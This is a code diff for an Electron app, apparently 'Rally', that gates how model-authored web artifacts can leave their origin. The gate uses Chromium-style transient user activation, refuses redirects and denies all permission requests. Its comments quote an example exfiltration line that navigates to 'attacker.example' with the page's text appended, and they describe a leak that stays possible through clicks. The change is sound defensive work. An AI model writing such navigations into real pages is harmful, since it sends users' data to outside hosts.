@@ -207,23 +207,193 @@ export function artifactWebPreferences(artifactId: string, packaged: boolean) {
 }
 
 /**
- * Lock a web contents to one artifact's origin, and deny everything else.
+ * How long a real input event keeps counting as the person's own action.
  *
- * Applied to both surfaces from one place. Navigation away is refused, every
- * permission request is denied outright — an artifact has no business asking
- * for a camera, and a prompt that appears to come from Rally is worse than one
- * that never appears — and **nothing the page composes is handed to the system
- * browser**.
+ * Not a number chosen here. Five seconds is Chromium's transient user
+ * activation lifespan (`blink::UserActivationState::kActivationLifespan`,
+ * Chromium source, read 2026-09-11) — the same window the page's own
+ * `navigator.userActivation.isActive` reports, and the same one the renderer
+ * uses to tell a person's popup from a blocked one. Electron reports no
+ * activation on `will-navigate` or on the window-open handler, so the main
+ * process reconstructs the state from the input events those contents receive;
+ * reconstructing it with some other span would make Rally and the page it is
+ * showing disagree about whether somebody is acting.
+ */
+export const TRANSIENT_ACTIVATION_LIFESPAN_MS = 5_000;
+
+/**
+ * The input events that start a transient activation.
  *
- * That last one is a reversal worth stating. Opening an off-origin link
- * externally reads as helpful, and it is how a normal embedded view behaves.
- * But artifact code is model-authored and can put whatever it likes in a URL:
- * `location = "https://attacker.example/?" + document.body.innerText` is a
- * navigation, not a `fetch`, so the CSP's `connect-src` and `form-action` do
- * not touch it — and handing that URL to the person's browser is Rally
- * *performing* the exfiltration the egress fence exists to prevent. A link a
- * person actually wants to follow is a cost paid to close that; they can copy
- * it out of the page.
+ * Mapped to the events HTML calls *activation-triggering* rather than to every
+ * representation of a press, because this set is a security boundary and a
+ * boundary wider than the one it claims to reconstruct is the wrong kind of
+ * wrong. So: the beginning of a press (`mouseDown`, `pointerDown`, a key going
+ * down) and the completion of a touch (`touchEnd`, `gestureTap`) — never the
+ * release half of a mouse or key press, and never the *start* of a touch.
+ *
+ * Each exclusion is a case. `mouseUp` and `keyUp` would arm on a press that
+ * began somewhere else and merely finished over this surface. `char` is a text
+ * event, not an interaction. `touchStart` would arm on a touch that goes on to
+ * be cancelled, which is a gesture the person abandoned. Pointer movement,
+ * hover, wheel, and the scroll gestures are not activation in any browser and
+ * would let a page navigate itself under a passing cursor, reaching the system
+ * browser having asked nobody.
+ *
+ * `pointerUp` is deliberately absent even though HTML admits it for non-mouse
+ * pointers: `InputEvent` carries no `pointerType`, so admitting it would admit
+ * the mouse case too — and a real non-mouse interaction has already armed this
+ * on its `pointerDown`.
+ */
+const ACTIVATING_INPUT_TYPES = new Set([
+  'mouseDown',
+  'pointerDown',
+  'keyDown',
+  'rawKeyDown',
+  'touchEnd',
+  'gestureTap',
+]);
+
+/**
+ * One artifact surface's transient user activation, kept in the main process.
+ *
+ * Per surface rather than per application: a flag shared between the rail
+ * preview and a pop-out would let a click in one send the other's page to the
+ * browser, and those two are showing different documents.
+ */
+export class ArtifactUserActivation {
+  private activatedAt: number | null = null;
+
+  constructor(private readonly now: () => number = Date.now) {}
+
+  /** Called for every input event the surface's contents receive. */
+  record(inputType: string): void {
+    if (ACTIVATING_INPUT_TYPES.has(inputType)) this.activatedAt = this.now();
+  }
+
+  /**
+   * Drop the activation because the document it belonged to is gone.
+   *
+   * Activation is a property of a document, not of a window, and a same-origin
+   * navigation does not spend it — so without this a press aimed at an ordinary
+   * in-site link would still be live when the *next* page loads, and that
+   * page's `onload` could spend somebody's click on a destination they never
+   * saw. Called when a main-frame navigation commits, which is the moment the
+   * document that was pressed stops existing.
+   */
+  reset(): void {
+    this.activatedAt = null;
+  }
+
+  /**
+   * Spend the activation on one departure, reporting whether there was one.
+   *
+   * Consuming is the half that makes this a gate rather than a five-second
+   * window of permission. `window.open` in a real browser consumes transient
+   * activation for the same reason: without it one press admits a loop, and a
+   * page that answers a click with a hundred `window.open` calls would send a
+   * hundred URLs to the system opener — an unbounded exfiltration channel and a
+   * tab flood, out of one press the person thought followed one link.
+   */
+  take(): boolean {
+    const active = this.active();
+    this.activatedAt = null;
+    return active;
+  }
+
+  /** Whether a navigation starting now is one a person just asked for. */
+  active(): boolean {
+    if (this.activatedAt === null) return false;
+    const elapsed = this.now() - this.activatedAt;
+    // A clock that moved backwards — a system time change mid-session — must
+    // read as "not activated" rather than as an activation that never expires.
+    return elapsed >= 0 && elapsed <= TRANSIENT_ACTIVATION_LIFESPAN_MS;
+  }
+}
+
+/** What an artifact surface may do with a navigation it is about to start. */
+export type ArtifactNavigationDecision = 'continue' | 'hand-off' | 'refuse';
+
+/**
+ * The one place that decides whether an artifact's navigation is followed,
+ * handed to the system browser, or dropped.
+ *
+ * Separate from the wiring below so the rule can be read and tested as a rule:
+ * it is the single sentence that says what a model-authored page can make this
+ * application do with a URL.
+ */
+export function decideArtifactNavigation(input: {
+  url: string;
+  origin: string;
+  /**
+   * Spend the surface's transient activation, reporting whether there was one.
+   *
+   * A callback rather than a boolean so that the deciding and the spending are
+   * one step and cannot come apart: a caller handed a boolean can forget to
+   * consume it, and the failure that follows is a page departing many times on
+   * one press. It is called **last**, so a press is never spent on a
+   * navigation that was going to be refused for some other reason, and **at
+   * most once** per navigation.
+   */
+  takeActivation: () => boolean;
+  /** The main process's own scheme policy for a URL it would hand to the OS. */
+  externalAllowed: (url: string) => boolean;
+}): ArtifactNavigationDecision {
+  if (sameOrigin(input.url, input.origin)) return 'continue';
+  if (input.externalAllowed(input.url) && input.takeActivation()) return 'hand-off';
+  return 'refuse';
+}
+
+/** The capability an artifact surface is confined with: how it may leave. */
+export interface ArtifactLinkHandoff {
+  /** Spend the surface's transient activation, reporting whether there was one. */
+  takeActivation(): boolean;
+  /** The main process's own scheme policy for a URL it would hand to the OS. */
+  externalAllowed(url: string): boolean;
+  openExternal(url: string): void;
+  /**
+   * Show a same-origin URL in this surface, for a link that asked for a window
+   * it cannot have. Never called with anything off-origin.
+   */
+  navigateInPlace(url: string): void;
+}
+
+/**
+ * Lock a web contents to one artifact's origin, and let only a person's own
+ * click leave it.
+ *
+ * Applied to both surfaces from one place. An off-origin navigation is never
+ * followed *in place*, and every permission request is denied outright — an
+ * artifact has no business asking for a camera, and a prompt that appears to
+ * come from Rally is worse than one that never appears.
+ *
+ * **The link handoff is gated on transient user activation, and the gate is the
+ * whole of it.** Artifact code is model-authored and can put whatever it likes
+ * in a URL: `location = "https://attacker.example/?" + document.body.innerText`
+ * is a navigation, not a `fetch`, so the CSP's `connect-src` and `form-action`
+ * do not touch it — and handing that URL to the person's browser unprompted
+ * would be Rally *performing* the exfiltration the egress fence exists to
+ * prevent. Requiring a press the page could not have made itself removes the
+ * unattended form of that: a site cannot send itself off-origin while nobody is
+ * there, and cannot do it on a timer, on load, or on a cursor passing over it.
+ *
+ * **The activation is spent by the departure it admits**, so one press buys one
+ * departure and not a five-second licence: a page that answers a click with a
+ * loop of `window.open` calls gets its first URL opened and no more. This is
+ * what `window.open` does to transient activation in a browser, and for the
+ * same reason.
+ *
+ * It does **not** remove the attended form, and that is stated rather than
+ * implied: a person clicking "Read the docs" cannot see where the link points,
+ * so a page that wants to leak through a click still can — one URL per press.
+ * What was bought is that every such handoff is somebody's own press, inside
+ * the five seconds a browser would also call theirs.
+ * `docs/live-web-artifacts.md` carries the whole of what is and is not closed
+ * here.
+ *
+ * A **redirect is not a click** and is refused whatever the activation says.
+ * The destination of a `302` is not the URL the person chose to follow, and a
+ * model-authored handler answers requests on this origin, so treating a
+ * redirect as activated would hand the gate straight back to the page.
  */
 export function confineToArtifactOrigin(
   contents: {
@@ -235,14 +405,46 @@ export function confineToArtifactOrigin(
     session: Pick<Session, 'setPermissionRequestHandler'>;
   },
   origin: string,
+  handoff: ArtifactLinkHandoff,
 ): void {
-  const fence = (event: { preventDefault(): void }, url: string): void => {
-    if (sameOrigin(url, origin)) return;
+  const decide = (url: string, handOffAllowed: boolean): ArtifactNavigationDecision => (
+    decideArtifactNavigation({
+      url,
+      origin,
+      // A redirect never spends the press either, so a click followed by a
+      // same-origin handler's `302` leaves the activation for the link the
+      // person actually goes on to follow.
+      takeActivation: () => handOffAllowed && handoff.takeActivation(),
+      externalAllowed: handoff.externalAllowed,
+    })
+  );
+  const fence = (
+    event: { preventDefault(): void },
+    url: string,
+    handOffAllowed: boolean,
+  ): void => {
+    const decision = decide(url, handOffAllowed);
+    if (decision === 'continue') return;
     event.preventDefault();
+    if (decision === 'hand-off') handoff.openExternal(url);
   };
-  contents.on('will-navigate', fence);
-  contents.on('will-redirect', fence);
-  contents.setWindowOpenHandler(() => ({ action: 'deny' }));
+  contents.on('will-navigate', (event, url) => fence(event, url, true));
+  contents.on('will-redirect', (event, url) => fence(event, url, false));
+  // A second artifact window is never created, so `target="_blank"` is answered
+  // by where the link goes rather than by a new window. Off-origin, it is the
+  // person's click and leaves through the same gate as any other link — it just
+  // leaves without a window being made. Same-origin, it is a page of the site
+  // somebody is already looking at, so it is shown in this surface: the nearest
+  // thing available to a new tab, and the only answer that keeps the viewer
+  // session, since a protected site opened anonymously in a browser answers 401.
+  // Dropping it, as this did first, left an ordinary class of in-site links
+  // doing visibly nothing.
+  contents.setWindowOpenHandler(({ url }) => {
+    const decision = decide(url, true);
+    if (decision === 'hand-off') handoff.openExternal(url);
+    if (decision === 'continue') handoff.navigateInPlace(url);
+    return { action: 'deny' };
+  });
   contents.session.setPermissionRequestHandler((_contents, _permission, callback) => {
     callback(false);
   });
